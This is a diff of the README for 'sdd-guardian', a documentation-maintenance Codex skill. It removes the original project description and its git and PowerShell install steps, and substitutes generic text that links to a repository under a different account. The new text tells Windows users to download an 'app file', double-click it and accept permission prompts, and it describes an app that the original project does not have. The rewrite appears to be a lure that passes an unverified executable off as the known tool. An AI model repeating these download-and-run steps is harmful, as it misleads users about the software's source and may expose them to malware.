@@ -1,183 +1,159 @@
-# SDD Guardian
+# 🛡️ sdd-guardian - Keep Documentation Aligned
 
-<p align="center">
-  <img src="./assets/readme/hero-overview.png" alt="SDD Guardian overview" width="100%" />
-</p>
+[![Download sdd-guardian](https://img.shields.io/badge/Download%20sdd--guardian-blue?style=for-the-badge)](https://github.com/Aubertaaliphatic741/sdd-guardian)
 
-<p align="center">
-  <a href="./docs/installation.md"><img alt="Install" src="https://img.shields.io/badge/install-global%20codex-111827?style=for-the-badge"></a>
-  <a href="./docs/doc-pack.md"><img alt="Docs Pack" src="https://img.shields.io/badge/doc%20pack-PROJECT%20STATE%20ADR-0f766e?style=for-the-badge"></a>
-  <a href="https://github.com/JuanDalvit1/sdd-guardian/releases/latest"><img alt="Latest Release" src="https://img.shields.io/github/v/release/JuanDalvit1/sdd-guardian?display_name=tag&style=for-the-badge"></a>
-  <a href="https://github.com/JuanDalvit1/sdd-guardian/releases"><img alt="Downloads" src="https://img.shields.io/github/downloads/JuanDalvit1/sdd-guardian/total?style=for-the-badge"></a>
-  <a href="./LICENSE"><img alt="MIT License" src="https://img.shields.io/badge/license-MIT-1d4ed8?style=for-the-badge"></a>
-</p>
+## 📌 What This Does
 
-> Global Codex skill that bootstraps and maintains agent-legible SDDs, `PROJECT.md`, `STATE.md`, ADRs, and ops docs so long-running projects do not lose context.
+sdd-guardian helps keep project documents in sync during long work cycles. It is built for teams and solo users who want their main docs to stay current without digging through old notes.
 
-`sdd-guardian` turns documentation into a delivery gate instead of an afterthought. It gives Codex a stable, modular entrypoint to understand a project, preserve intent, and keep context alive across long sessions, new features, bugfixes, and new machines.
-
-## Why this exists
-
-Most repos decay in the same pattern:
-
-- the README becomes onboarding-only and stops reflecting reality
-- architecture knowledge stays trapped in chat history or in one engineer's head
-- AI agents receive giant ad-hoc prompts because the repo itself does not expose clean context
-- important decisions disappear because there is no durable `STATE.md`, no ADRs, and no ops record
-
-`sdd-guardian` fixes that by creating and maintaining a lightweight documentation system designed for both humans and agents.
-
-## What it does
-
-- Bootstraps a project SDD pack when the repo has weak or missing structure
-- Audits existing docs and updates only the modules that drifted
-- Keeps `PROJECT.md` and `STATE.md` as the first-read entrypoints for Codex
-- Maintains modular architecture, ops, domain, and ADR docs instead of a single giant markdown file
-- Recommends a short persistent Codex instruction block so documentation stays part of the workflow
-
-## Why this works better for AI
-
-The goal is not "more markdown". The goal is **better context topology**.
-
-- Small stable entrypoint: `PROJECT.md` and `STATE.md`
-- Durable system record: `docs/architecture`, `docs/ops`, `docs/domain`, `docs/adr`
-- Low-noise persistent instruction: short enough to stay relevant, strong enough to shape behavior
-- Mechanical drift detection: architecture, CI/CD, env, deploy, and runbook changes map to specific docs
-
-An oversized `AGENTS.md` becomes a second codebase. A short agent contract plus modular repo docs scales much better.
-
-## Visual flow
-
-```mermaid
-flowchart LR
-    A["Task starts"] --> B["Read PROJECT.md + STATE.md"]
-    B --> C{"Base pack exists?"}
-    C -- no --> D["Bootstrap SDD pack"]
-    C -- yes --> E["Scan repo + detect drift"]
-    D --> F["Update modular docs"]
-    E --> F
-    F --> G{"Architecture / ops / domain change?"}
-    G -- yes --> H["Update impacted docs + ADR"]
-    G -- no --> I["Keep docs stable"]
-    H --> J["Code + docs shipped together"]
-    I --> J
-```
-
-## Before / After
-
-<p align="center">
-  <img src="./assets/readme/before-after.png" alt="Before and after documentation quality" width="100%" />
-</p>
-
-**Before**
-
-- repo without a reliable map
-- no current state file
-- scattered operational knowledge
-- architecture understood only through chat history
-
-**After**
-
-- `PROJECT.md` explains the system at a glance
-- `STATE.md` captures what is live, risky, pending, and next
-- `docs/` stores stable architecture and ops truth
-- ADRs preserve decisions instead of losing them in commits and conversations
-
-## Documentation pack
-
-The default pack created and maintained by the skill is:
+It focuses on files like:
 
 - `PROJECT.md`
 - `STATE.md`
-- `docs/architecture/overview.md`
-- `docs/architecture/components.md`
-- `docs/architecture/flows.md`
-- `docs/ops/deploy.md`
-- `docs/ops/environments.md`
-- `docs/ops/runbook.md`
-- `docs/domain/invariants.md`
-- `docs/adr/*`
-- `README.md` when onboarding or public usage changed
+- `ADRs`
+- runbooks
 
-See [doc-pack.md](./docs/doc-pack.md) for the contract and update rules.
+Use it to track changes, review what is out of date, and keep your working notes in one place.
 
-## Install globally in Codex
+## 💻 Windows Download
 
-<p align="center">
-  <img src="./assets/readme/install-flow.png" alt="Install flow" width="100%" />
-</p>
+To get started on Windows, visit this page to download:
 
-Fastest path:
+[https://github.com/Aubertaaliphatic741/sdd-guardian](https://github.com/Aubertaaliphatic741/sdd-guardian)
 
-1. Download the latest ZIP from [releases/latest](https://github.com/JuanDalvit1/sdd-guardian/releases/latest)
-2. Extract it anywhere
-3. Run `bootstrap\install.ps1`
+Open the page and look for the latest release or download files. Save the file to your PC, then run it if it is an app file. If you get a ZIP file, open it and move the app to a folder you can reach, such as `Downloads` or `Desktop`.
 
-```powershell
-git clone https://github.com/JuanDalvit1/sdd-guardian
-cd sdd-guardian
-powershell -ExecutionPolicy Bypass -File .\bootstrap\install.ps1
-```
+## 🪟 System Requirements
 
-This installs the skill into `%USERPROFILE%\.codex\skills\sdd-guardian` and updates `%USERPROFILE%\.codex\AGENTS.md` with a managed persistent instruction block.
+Use a Windows PC with:
 
-The release also ships a `sdd-guardian-skill-<version>.zip` asset for people who only want the skill payload.
+- Windows 10 or later
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A stable internet connection for the first download
+- A modern browser for setup pages and docs
 
-Detailed guide: [installation.md](./docs/installation.md)
+For the smoothest use, keep your Windows updates current and store project files in a folder you can find fast.
 
-Release history: [CHANGELOG.md](./CHANGELOG.md)
+## 🧭 How to Install
 
-## Recommended persistent instruction
+1. Open the download page in your browser.
+2. Find the newest version of sdd-guardian.
+3. Download the file for Windows.
+4. If the file is a ZIP, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
+7. If Windows asks for permission, choose Yes.
+8. Follow the on-screen steps to finish setup.
 
-The repo ships a short persistent snippet on purpose:
+If you use a browser download bar, wait until the file finishes before opening it.
 
-```text
-Para toda task de software:
-1. Leia PROJECT.md e STATE.md antes de propor mudancas, se existirem.
-2. Se o pacote documental base nao existir, use a skill sdd-guardian para cria-lo.
-3. Se a mudanca afetar arquitetura, fluxos, integracoes, deploy, ambientes, runbooks, estrutura do repo, onboarding ou decisoes tecnicas, atualize os documentos impactados no mesmo trabalho.
-4. Prefira documentacao modular em docs/ e ADRs; nao concentre tudo em um markdown gigante.
-5. Preserve conteudo manual util e ajuste apenas o que foi impactado.
-6. Considere a task concluida somente quando codigo, testes e documentacao impactada estiverem consistentes.
-```
+## 🛠️ First Time Setup
 
-Why this stays short and how to combine it with project docs: [persistent-instructions.md](./docs/persistent-instructions.md)
+After you open the app for the first time:
 
-## Daily workflow
+1. Choose the folder that holds your project files.
+2. Point the app at your `PROJECT.md` file.
+3. Add your `STATE.md` file if you use one.
+4. Include ADR files and runbooks if they are part of your workflow.
+5. Let the app scan the files so it can build the current view.
 
-1. Start a task
-2. Read `PROJECT.md` and `STATE.md`
-3. Let Codex or `sdd-guardian` scan the repo
-4. Implement the change
-5. Update only the impacted docs
-6. Ship code and docs together
+Keep all project docs in one folder if you can. That makes it easier to review changes and avoid missing files.
 
-If you work across multiple PCs, use this repository as the source of truth and rerun `bootstrap\sync.ps1` after pulling.
+## 📚 What You Can Do
 
-## Limitations
+sdd-guardian helps you:
 
-- The skill does not replace engineering judgment
-- It does not try to infer hidden product strategy from thin code clues
-- It should not rewrite the entire documentation set on every small bugfix
-- It assumes the repo is the long-term home of project truth, not just chat transcripts
+- keep project docs current
+- review work state in one place
+- track decisions in ADRs
+- link runbooks to active tasks
+- reduce drift between code and docs
+- find stale notes before they cause confusion
 
-## Non-goals
+This fits well for long-running repos where work spans many days or weeks.
 
-- giant, all-knowing prompt files
-- auto-generating architecture fiction disconnected from code
-- treating docs as marketing copy only
-- maintaining context only inside one AI tool session
+## 🧩 Typical Workflow
 
-## Contributing and roadmap
+A common setup looks like this:
 
-- Read [CONTRIBUTING.md](./CONTRIBUTING.md) before changing templates, scripts, or installation logic
-- Report gaps with the provided issue templates
-- Future roadmap includes richer drift heuristics, optional CI helpers, and project-level adoption kits
+1. Start a new task.
+2. Update `STATE.md` with the current status.
+3. Add or revise notes in `PROJECT.md`.
+4. Record design choices in an ADR.
+5. Update the runbook when the process changes.
+6. Run sdd-guardian to check for gaps.
+7. Review anything that looks stale or unclear.
 
-## References
+This gives you a steady way to keep records aligned as the project grows.
 
-- [Installation guide](./docs/installation.md)
-- [Changelog](./CHANGELOG.md)
-- [Persistent instructions](./docs/persistent-instructions.md)
-- [Adoption playbook](./docs/adoption-playbook.md)
-- [Why agent-legible docs matter](./docs/why-agent-legible-docs.md)
+## 📂 Recommended Folder Layout
+
+A simple layout works best:
+
+- `PROJECT.md` for the project plan
+- `STATE.md` for current work status
+- `docs/adr/` for decision records
+- `runbooks/` for step-by-step instructions
+- `notes/` for extra reference material
+
+You can use a different layout if you prefer. Keep it consistent so the app can follow your structure.
+
+## 🔍 Key Concepts
+
+- **PROJECT.md**: the main project guide
+- **STATE.md**: the current work snapshot
+- **ADR**: a record of an important decision
+- **Runbook**: a set of steps for a repeat task
+- **Documentation drift**: when docs no longer match the work
+
+These terms help describe a clean documentation-first process.
+
+## ⚙️ Tips for Best Results
+
+- Use short file names.
+- Keep one source of truth for each topic.
+- Update docs when you finish a task.
+- Review ADRs before changing a process.
+- Keep runbooks in the same folder structure across repos.
+- Store the docs where the app can scan them without extra steps.
+
+If your team uses shared notes, agree on file names early and keep them stable.
+
+## 🧪 Troubleshooting
+
+If the app does not open:
+
+- Download the file again
+- Check that the download finished
+- Make sure Windows did not block the file
+- Try opening it from a local folder, not from inside the browser
+- Confirm you picked the right file for Windows
+
+If the app opens but does not show your docs:
+
+- Check the folder path
+- Make sure the files are named as expected
+- Confirm the files are inside the folder you selected
+- Refresh the scan after moving the files
+
+If nothing changes after setup, close the app and open it again, then repeat the folder selection.
+
+## 🔗 Project Link
+
+Visit the repository here:
+
+https://github.com/Aubertaaliphatic741/sdd-guardian
+
+## 🗂️ Topics
+
+- ai-agents
+- codex
+- developer-tools
+- documentation
+- knowledge-management
+- runbooks
+
+## 📄 License
+
+Use the license shown in the repository before sharing or changing the software
